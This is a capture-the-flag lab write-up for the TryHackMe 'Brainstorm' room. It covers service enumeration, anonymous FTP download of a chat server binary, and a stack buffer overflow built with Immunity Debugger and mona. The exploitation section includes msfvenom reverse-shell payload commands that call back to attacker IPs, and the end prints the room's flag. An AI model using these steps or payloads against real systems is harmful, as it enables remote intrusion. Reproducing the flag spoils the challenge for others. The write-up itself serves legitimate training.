# Lab Report - Brainstorm


# Overview 
---
- **Difficulty**: Medium 
- **Platform**: Windows
- **Link**: https://tryhackme.com/room/brainstorm

## Challenge Description 
---
>**Reverse engineer a chat program and write a script to exploit a Windows machine.

## Resolution Summary 
---
**We discovered available services with an `Nmap` scan, revealing FTP, RDP, and a chat server on port 9999. We connected to the FTP server anonymously and retrieved a `chatserver.exe` and its associated `.dll`. We transferred both files to a Windows VM running `Immunity Debugger` and `Mona` to perform buffer overflow analysis: we identified the crash, determined the `EIP` offset, checked for bad characters, found a `JMP ESP` instruction in the unprotected `essfunc.dll` module, and generated a reverse shell payload with `msfvenom`. We then ran the exploit against the live target, landing directly as Administrator with no privilege escalation required.**

# Information Gathering 
---
- **First of all, we began by running an `Nmap` scan on the target in order to find open ports. We used  the `-Pn` flag because the target does not respond to ICMP packets.** 
```bash
sudo nmap -Pn 10.82.162.156
```
	- Adding the -p- flag did not provide additional results. 

- **We discovered the following results:**
```bash
PORT     STATE SERVICE
21/tcp   open  ftp
3389/tcp open  ms-wbt-server
9999/tcp open  abyss
```

- **After a quick research, we found out that the abyss service is a web server.**
- **We also noticed that we can connect over RDP on port `3389`.
- **From here, we started by further enumerate the available services.**

## ABYSS (9999)
---
- **We could not access the website on a web browser. And since we later discovered that there is a chatserver application available, we assumed that we could use `Netcat` to connect on this server in order to be able to access the chatserver application.** 
## FTP (21)
---
- **We connected to the FTP server using the `ftp` command:**
```bash
telnet 10.82.162.156 21
```

- **We attempted to login as `anonymous`, and we found that this option was enabled, which allowed us to gain a first foothold on the server:** 
```bash
user anonymous
pass #Then press enter 
```

- **We started by enumerating the the target system type using `syst`, confirming that the platform is Windows:**
```bash
syst
#result
215 Windows_NT
```

- **Next, we listed available commands using:**
```bash
help
```

- **We started by switching to `binary` instead of `ASCII`:**
```bash
binary
```

- **Then, we used `ls` and found an executable and a `.dll` file under `/chatserver`:**
```bash
passive #Disable passive mode.
ls
cd chatsever
```

- **We uploaded the files locally with:**
```bash
get chatserver.exe
get essfunc.dll
```
# Exploitation 
---
- **Since we had an `.exe` program, we decided to transfer both files on a Windows VM (7 x86) where we installed `Immunity Debugger` and `Mona` for buffer overflow exploitation.** 

- **We used the following command to transfer the files over:** 
```bash 
#On Kali
python3 -m http.server 8000 
#On Windows VM
http://192.168.100.10:8000/chatserver.exe
http://192.168.100.10:8000/essfunc.dll
```

- **We began by running the `.exe` file on the Windows VM and we tried to connect to it over `Netcat` with:**
```bash
nc 192.168.100.50 9999
```
	- Note: you need to provide you Windows VM IP, not target IP (THM).

- **We got access to the chatserver and we were prompted for a username with a maximum of 20 characters. Given this explicit limit, we tried to see if it can be exploited for buffer overflow.** 
- **We generated the following string and used it as a username:** 
```bash
python3 -c 'print (A" *2000)'
```

- **However, given the output on the chat server, we assumed that the usernames was effectively truncated to fit the 20 characters limit.** 
- **Next, we were prompted to enter a message, we tried the same operation as before, and nothing happened again. Therefore, we generated a larger message:** 
```bash
python -c 'print ("A" * 8000)'
```

- **And the chat server did crash, which highlighted a possible buffer overflow exploit.** 

- **From there, we launched `Immunity debugger` to further investigate the matter.** 
- **We opened the `.exe` file in `Immunity debugger` and we ran it.** 

- **After executing the same steps as before, we noticed on `Immunity Debugger` that the `EIP` was overwritten (confirming buffer overflow vulnerability). Hence, we attempted to determine the offset of the `EIP`. **

- **For that purpose, we used the following binaries from `Metasploit`:** 
```bash
#Generate a string pattern and use it as a message on the chat server
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```

- **Next, we retrieve the overwritten `EIP` value: `31704330`**

- **Then, we use the second binary, which will determine the `EIP` offset:**
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 31704330
#Output
[*] Exact match at offset 2012
```

- **Hence, we were able to craft our payload. The idea is first to ensure that we found the right offset, we will use the following as a message for that:**
```bash
python3 -c 'print ("A"*2012 + "B"*4)'
#We expect the EIP value to be 42424242. (B in hex)
```

- **We did find that the `EIP` value was `42424242`.** 

- **Before generating our shellcode, we examined bad characters first (to identify which characters are misinterpreted/rejected by the application, if any filtering/sanitizing is performed) using the following [GitHub repository](https://github.com/cytopia/badchars).**
- **Since raw bytes get immediately converted, we need to use a python script for our exploit:**
```bash
python3 bof.py
```
	- Important note: you must use "b" in each line for badchars to conserve raw bytes (no conversion).
	- The script is available on the writeup repository.

- **We did not find any badchars (except `x00`).** 

- **After that, we used the  `!mona modules` command (on the bottom bar in `Immunity debugger`) in order to find modules with no security protections (ASLR,...). We found that this module did not have any protection:** 
```bash
Log data, item 19
 Address=0BADF00D
 Message= 0x62500000 | 0x6250b000 | 0x0000b000 | False  | False   | False | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\Lenovo\Downloads\essfunc.dll) 0x0
```

- **Next, we looked for a `JMP ESP` (identified with  `\xff\xe4\`) instruction inside the `essfunc.dll` module using the following (same search bar as previously):** 
```bash
!mona find -s "\xff\xe4" -m essfunc.dll
```

- **We could take any pointers from this list (we started by the first one):**
```bash
#Output of previous command (first pointer only):
Log data, item 11
 Address=625014DF
 Message=  0x625014df : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\Lenovo\Downloads\essfunc.dll), 0x0
```

- **The reason why we looked for a `JMP ESP` instruction is because we want our return address (`EIP`) to point to the next instruction right after `RIP` (which will be our nop-sled+shellcode), which is stored at `ESP`. **

- **Next, we needed to generate  shellcode, we used `msfvenom` for that:** 
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.10 LPORT=1234 -f c -b "\x00"
```

- **Finally, we crafted another python script in order to gain a reverse shell:** 
```bash
python3 bof_revshell.py
```
	- Note: the script can be found the the writeup repository.

- **Now, in order to exploit the chat server on the target (THM), we change the IP address to TryHackMe's target IP.** 

- **Furthermore, we generate another reverse shell, with our IP adress from the VPN connection with THM's network.** 
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.200.109 LPORT=1234 -f c -b "\x00"
```

- **We ended up with an Administrator shell from the get go and we obtained the root flag.** 
# Privilege Escalation 
---
- **None was required in this room.**


# Trophy 
---
**Root.txt → `5b1001de5a44eca47eee71e7942a8f8a`**

# Extra Mile 
---
- **We can write another python scripts that takes the hex dump from `Immunity debugger` as input, and it looks for badchars (instead of manual inspection).** 

# Lessons Learned
---
- **Always try multiple string lengths**: here 2000 characters were not enough, but 8000 were enough to crash the application. 